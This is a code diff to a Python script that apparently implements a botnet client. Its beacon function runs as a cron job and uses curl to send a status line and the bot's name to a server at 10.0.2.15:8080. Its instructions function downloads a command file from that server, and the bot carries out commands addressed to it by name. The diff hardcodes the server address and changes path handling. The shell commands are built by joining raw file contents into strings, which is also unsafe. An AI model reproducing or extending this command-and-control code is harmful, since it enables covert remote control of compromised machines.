@@ -44,17 +44,16 @@ def namecheck():
 			close()
 #this is a beacon that runs as a cronjob and sends the current time "Online" and the name of the bot
 def beacon():
-	dir = os.path.join('./','.bot')
-	os.chdir(dir)
-	myname = open('name.txt', 'r')
+	myname = os.path.abspath(".bot/name.txt")
+	rmyname = open(myname, 'r')
 	x = datetime.now()
 	current_time = x.strftime("%H:%M:%S")
-	data = current_time+' Online '+myname.read()
-	request = 'curl -d "'+data+'" http://{IP}:8080/log.txt'
+	data = current_time+' Online '+rmyname.read()
+	request = 'curl -d "'+data+'" http://10.0.2.15:8080/log.txt'
 	os.system(request)
 #this checks the instructions page on the server and does the commands labeled with its name that it sees
 def instructions():
-	dir = os.path.join('./','.bot')
+	dir = os.path.abspath('.bot/')
 	os.chdir(dir)
 	os.system('curl 10.0.2.15:8080/instructions.txt > response.txt')
 	os.system('cat name.txt > sendthis.txt')
